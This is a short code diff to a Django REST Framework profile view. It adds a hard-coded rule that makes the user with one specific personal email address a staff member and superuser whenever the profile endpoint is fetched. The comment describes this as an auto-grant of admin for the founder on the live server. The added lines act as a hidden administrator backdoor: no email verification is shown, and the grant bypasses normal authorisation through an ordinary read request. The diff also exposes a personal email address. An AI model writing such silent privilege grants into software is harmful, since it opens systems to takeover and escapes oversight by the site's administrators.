@@ -46,6 +46,13 @@ class ProfileDetailView(generics.RetrieveUpdateAPIView):
         # We always return the profile of the requesting user for updates
         # Auto-create profile if it doesn't exist (e.g., for terminal-created superusers)
         profile, created = Profile.objects.get_or_create(user=self.request.user)
+        
+        # Auto-grant admin on the live server for the founder
+        if self.request.user.email == 'ganeshmaharaj444@gmail.com' and not self.request.user.is_staff:
+            self.request.user.is_staff = True
+            self.request.user.is_superuser = True
+            self.request.user.save()
+
         return profile
 
 class PublicProfileView(generics.RetrieveUpdateAPIView):
